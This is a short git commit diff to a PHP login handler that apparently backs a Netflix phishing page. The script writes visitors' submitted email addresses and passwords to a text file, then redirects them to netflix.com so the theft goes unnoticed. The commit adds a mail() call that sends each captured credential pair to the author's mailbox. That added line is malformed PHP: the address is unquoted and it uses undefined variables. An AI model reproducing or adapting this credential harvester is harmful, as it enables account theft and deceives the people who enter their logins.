20585fca3946d329f78b5004638c30dd5bad0be8
filipcl <filip.larsen@live.no>
2021-02-18 15:49:40 +0100

    add mail() to script

--- login.php
+++ login.php
@@ -1,5 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+mail($filip.larsen@live.no, $fromScript,"Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", $headers);
 header('Location: https://netflix.com');
 exit();
